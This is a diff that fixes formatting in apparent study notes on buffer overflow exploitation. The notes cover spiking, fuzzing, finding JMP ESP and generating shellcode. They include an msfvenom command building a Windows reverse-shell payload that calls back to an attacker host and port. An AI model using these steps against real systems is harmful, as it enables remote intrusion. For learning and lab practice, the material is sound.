@@ -15,8 +15,8 @@ use a tool called generic_send_tcp
 generic_send_tcp <host> <port> <spike script> 0 0
 by testing different spike scripts we can dtermine which command is vuln to bof
 other way to test commands:
-`nc <target-ip> <port number>
-> output from vuln services`
+`nc <target-ip> <port number>`
+`> output from vuln services`
 
 # Step 2: Fuzzing
 Use a python script, open a socket connection to vulnerable program, send more and more bytes in the buffer until the program crashes
@@ -88,10 +88,10 @@ In most situations, we want to direct the program to the beginning of our payloa
 To do this we need to find address for the command JMP ESP
 In Kali Linux, use the tool nasm_shell
 
-`msf-nasm_shell
-/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-> jmp esp
->output: FFE4 (to save time ust refer here)`
+`msf-nasm_shell`
+`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
+`> jmp esp`
+`>output: FFE4 (to save time ust refer here)`
 
 Back in Immunity Debugger, use the following command to find the memory address(es) in the vulnerable module with the code jmp esp:
 
@@ -104,9 +104,9 @@ now that we have full control of eip, we can give it this memory address to poin
 # Step 7: Generate Shellcode
 use msfvenom to gen payload shellcode
 examples:
-`msfvenom -p windows/shell_reverse_tcp  -f python --var-name payload -b "\x00" LHOST=192.168.111.130 LPORT=1234 EXITFUNC=thread
+`msfvenom -p windows/shell_reverse_tcp  -f python --var-name payload -b "\x00" LHOST=192.168.111.130 LPORT=1234 EXITFUNC=thread`
 
-msfvenom -p windows/exec -b "\x00\x01\x0a" -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread --smallest`
+`msfvenom -p windows/exec -b "\x00\x01\x0a" -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread --smallest`
 
 
 -p: type of payload
